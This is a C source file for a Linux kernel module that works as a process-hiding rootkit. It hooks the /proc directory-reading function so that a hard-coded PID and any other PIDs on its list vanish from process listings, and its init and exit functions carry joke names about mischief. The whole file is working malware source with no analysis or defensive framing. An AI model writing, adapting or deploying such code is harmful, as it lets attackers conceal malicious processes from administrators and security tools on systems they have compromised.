#include "common.h"
#include <linux/capability.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <linux/init.h>

#define TMPSZ 150
#define MY_PID 2387

static int (*o_proc_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);


unsigned long *sys_call_table;
unsigned long *ia32_sys_call_table;

struct s_proc_args {
    unsigned short pid;
};

struct hidden_proc {
    unsigned short pid;
    struct list_head list;
};

LIST_HEAD(hidden_procs);

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;



void *get_vfs_readdir ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->readdir;

    filp_close(filep, 0);

    return ret;
}

static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_procs, list )
	{
		#if __DEBUG__
		printk("hp->pid: %d\tpid: %d\n", hp->pid, (unsigned int)pid);
		#endif
        if ( pid == hp->pid )
            return 0;
	}

    return o_proc_filldir(__buf, name, namelen, offset, ino, d_type);
}

/*
*struct file: http://blog.csdn.net/wangchaoxjtuse/article/details/6036684
*/
int n_proc_readdir ( struct file *file, void *dirent, filldir_t filldir )
{
    int ret;

    o_proc_filldir = filldir;

    hijack_pause(o_proc_readdir);
    ret = o_proc_readdir(file, dirent, &n_proc_filldir);
    hijack_resume(o_proc_readdir);

    return ret;
}



void hide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->pid = pid;

    list_add(&hp->list, &hidden_procs);
}

void unhide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    list_for_each_entry ( hp, &hidden_procs, list )
    {
        if ( pid == hp->pid )
        {
	    list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}

static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
{


    /* 
	* proc 文件系统参考：http://blog.csdn.net/zhoujian19880205/article/details/7425724
	*Hook /proc for hiding processes
	*/
    o_proc_readdir = get_vfs_readdir("/proc");
    hijack_start(o_proc_readdir, &n_proc_readdir);

	
	#if __DEBUG__
	printk("Hiding PID %hu\n", MY_PID);
	#endif

	hide_proc(MY_PID);

    return 0;
}

static void __exit mischief_managed ( void )
{

    hijack_stop(o_proc_readdir);
}

module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);

MODULE_LICENSE("GPL");



